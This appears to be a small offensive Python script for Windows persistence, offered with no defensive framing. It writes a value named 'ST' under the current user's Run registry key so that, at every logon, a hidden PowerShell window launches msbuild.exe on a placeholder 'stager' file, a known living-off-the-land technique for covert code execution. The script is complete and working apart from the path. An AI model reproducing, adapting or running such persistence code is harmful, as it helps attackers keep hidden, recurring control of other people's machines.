import _winreg as winreg

def write_key():
    reg_key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r'Software\Microsoft\Windows\CurrentVersion\Run',
        0, winreg.KEY_SET_VALUE)
    stager_path = "PATH"
    value = r'powershell.exe -WindowStyle hidden -NoExit -Command C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe {}'.format(stager_path)
    with reg_key:
        winreg.SetValueEx(reg_key, 'ST', 0, winreg.REG_SZ, value)
    return 'Registry key set'
        
print(write_key())
